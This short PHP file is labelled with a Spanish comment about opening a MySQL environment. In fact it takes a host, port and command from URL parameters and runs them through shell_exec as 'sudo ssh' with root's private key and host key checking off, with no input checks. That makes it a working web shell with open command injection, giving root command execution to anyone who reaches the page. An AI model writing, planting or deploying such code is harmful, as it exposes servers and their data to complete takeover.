<?php
// ABRIMOS EL ENTORNO DE MYSQL //
// require_once($_SERVER['DOCUMENT_ROOT']."/Resources/styles_js/ssh2.php");
echo shell_exec('sudo ssh -qa -p'.$_GET['port'].' -lroot -i /root/id_rsa -o StrictHostKeyChecking=no -o ConnectTimeout=3 '.$_GET['host'].' "'.$_GET['comando'].'"');

?>